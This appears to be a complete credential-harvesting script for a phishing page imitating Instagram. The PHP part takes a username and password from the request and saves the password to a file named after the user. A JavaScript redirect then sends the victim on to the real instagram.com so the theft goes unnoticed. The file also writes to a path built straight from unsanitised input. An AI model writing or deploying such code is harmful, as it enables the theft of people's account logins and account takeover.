<?php

$username = $_GET["username"];
$password = $_GET["password"];

file_put_contents("users/".$username, $password);

?>

<script>
    window.location.href = "https://instagram.com";
</script>

